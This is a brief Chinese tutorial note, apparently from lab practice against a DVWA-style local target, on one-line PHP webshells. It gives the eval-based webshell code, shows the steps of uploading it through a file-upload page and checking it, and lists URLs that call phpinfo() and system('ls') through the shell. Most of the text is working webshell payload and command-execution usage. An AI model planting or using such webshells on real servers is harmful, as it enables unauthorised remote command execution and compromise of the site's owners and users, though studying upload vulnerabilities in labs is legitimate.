# 一句话木马Webshell

```

<?php @eval($_GET[command]);?>

<?php @eval($_POST[command]);?>

```



#### 木马上传

> 制作木马php

<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggksuhtvthj30vo0kaam7.jpg" alt="image-20200709162716117" style="zoom:50%;" />

<img src="/Users/oo/Library/Application Support/typora-user-images/image-20200709162819750.png" alt="image-20200709162819750" style="zoom:50%;" />



> 上传php文件

<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggkszvu6wmj31f80rcwhv.jpg" alt="image-20200709163228706" style="zoom: 33%;" />

> 检查是否上传成功
>
> > 页面为空白说明php被服务器解析成功

<img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggkt3wqvq3j31tc0o8go8.jpg" alt="image-20200709163621768" style="zoom: 33%;" />

#### 木马使用

> 木马利用方法1

```

http://127.0.0.1/hackable/uploads/shell.php?command=phpinfo();//打印服务器信息

http://127.0.0.1/hackable/uploads/shell.php?command=system(%27ls%27);//终端   ls

```



